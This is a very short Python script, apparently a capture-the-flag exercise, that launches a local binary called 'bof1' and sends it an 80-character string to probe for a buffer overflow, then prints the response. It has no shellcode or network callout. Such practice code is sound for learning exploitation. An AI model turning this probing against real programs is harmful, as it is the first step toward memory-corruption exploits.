from ctf_info import *

t = process('../bof1')
#print t.recv(10)
t.sendline("go"*40)
print(t.recv(1024))
